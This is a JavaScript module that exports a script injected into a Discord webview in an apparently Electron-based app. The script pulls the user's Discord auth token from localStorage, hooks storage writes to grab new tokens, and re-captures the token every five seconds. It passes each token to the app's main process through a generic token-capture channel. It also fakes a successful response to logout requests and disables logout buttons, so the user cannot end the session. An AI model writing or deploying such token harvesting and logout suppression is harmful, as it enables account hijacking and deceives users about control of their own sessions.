/**
 * 💬 Discord Capture Script
 * Script específico para capturar y mantener sesión en Discord
 * Este script se ejecuta en el contexto del webview de Discord
 */

export const DISCORD_CAPTURE_SCRIPT = `
(function() {
  'use strict';
  
  // Verificar si ya está instalado
  if (window.__KOKO_DISCORD_CAPTURE_INSTALLED__) {
    return;
  }
  window.__KOKO_DISCORD_CAPTURE_INSTALLED__ = true;
  
  console.log('💬 [DiscordCapture] Script de captura activado para Discord');
  
  // Función para capturar token de Discord
  function captureDiscordToken() {
    try {
      // Buscar en localStorage
      const token = localStorage.getItem('token');
      if (token) {
        console.log('💬 [DiscordCapture] Token de Discord encontrado');
        
        // Enviar token al main process
        if (window.electronAPI?.discord?.saveToken) {
          const cleanToken = token.replace(/"/g, '');
          window.electronAPI.discord.saveToken(cleanToken);
          console.log('✅ [DiscordCapture] Token enviado al main process');
        } else if (window.electronAPI?.tokenCapture?.process) {
          window.electronAPI.tokenCapture.process({
            service: 'Discord',
            domain: 'discord.com',
            token: token.replace(/"/g, ''),
            source: 'localStorage',
            timestamp: new Date().toISOString()
          });
        }
        
        return token;
      }
    } catch (error) {
      console.error('💬 [DiscordCapture] Error capturando token:', error);
    }
    return null;
  }
  
  // Restaurar token al iniciar
  function restoreDiscordSession() {
    try {
      const token = localStorage.getItem('token');
      if (token) {
        console.log('💬 [DiscordCapture] Token encontrado, manteniendo sesión');
        localStorage.setItem('discord_persistent_session', 'true');
        localStorage.setItem('discord_remember_me', 'true');
        
        // Redirigir a la app si estamos en login
        if (window.location.href.includes('/login') || window.location.href.includes('/register')) {
          console.log('💬 [DiscordCapture] Redirigiendo a Discord app...');
          setTimeout(() => {
            if (!window.location.href.includes('/channels') && !window.location.href.includes('/app')) {
              window.location.href = 'https://discord.com/app';
            }
          }, 500);
        }
      }
    } catch (error) {
      console.error('💬 [DiscordCapture] Error restaurando sesión:', error);
    }
  }
  
  // Observar cambios en localStorage para capturar token automáticamente
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function(key, value) {
    const result = originalSetItem.apply(this, arguments);
    
    if (key === 'token' && value) {
      console.log('💬 [DiscordCapture] Nuevo token detectado');
      
      if (window.electronAPI?.discord?.saveToken) {
        const cleanToken = value.replace(/"/g, '');
        window.electronAPI.discord.saveToken(cleanToken);
      }
    }
    
    return result;
  };
  
  // Bloquear peticiones de logout
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    
    // Bloquear logout
    if (typeof url === 'string' && url.includes('/logout')) {
      console.log('🚫 [DiscordCapture] Bloqueando petición de logout');
      return Promise.resolve(new Response('{"success": true}', { 
        status: 200,
        headers: {'Content-Type': 'application/json'}
      }));
    }
    
    return originalFetch.apply(this, args);
  };
  
  // Bloquear botones de logout en el DOM
  function blockLogoutButtons() {
    const logoutButtons = document.querySelectorAll('[aria-label*="Log Out"], [aria-label*="Cerrar sesión"]');
    logoutButtons.forEach(button => {
      button.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log('🚫 [DiscordCapture] Botón de logout bloqueado');
      }, true);
    });
  }
  
  // Observer para bloquear botones de logout dinámicos
  const observer = new MutationObserver(() => {
    blockLogoutButtons();
  });
  
  // Inicializar
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      restoreDiscordSession();
      captureDiscordToken();
      blockLogoutButtons();
      
      if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
      }
    });
  } else {
    restoreDiscordSession();
    captureDiscordToken();
    blockLogoutButtons();
    
    if (document.body) {
      observer.observe(document.body, { childList: true, subtree: true });
    }
  }
  
  // Capturar token periódicamente
  setInterval(() => {
    captureDiscordToken();
  }, 5000);
  
  console.log('✅ [DiscordCapture] Sistema de captura de Discord inicializado');
})();
`;

export default DISCORD_CAPTURE_SCRIPT;
